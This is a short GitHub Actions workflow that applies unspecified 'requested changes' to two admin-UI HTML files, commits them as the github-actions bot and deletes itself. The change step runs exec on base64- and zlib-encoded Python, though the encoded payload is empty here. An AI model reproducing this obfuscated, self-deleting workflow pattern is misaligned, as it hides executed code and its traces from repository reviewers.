name: Temporary edit admin UI update
on:
  push:
    paths:
      - '.github/workflows/tmp-edit-admin-ui-v2.yml'
permissions:
  contents: write
jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Apply requested changes
        shell: bash
        run: python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('')) )"
      - name: Commit changes and remove temporary workflows
        shell: bash
        run: |
          rm -f .github/workflows/tmp-edit-admin-ui-v2.yml .github/workflows/tmp-home-layout-ui-adjust.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add home-layout-edit.html home-layout-admin.html .github/workflows
          git commit -m "Rework edit and admin operation flow"
          git push
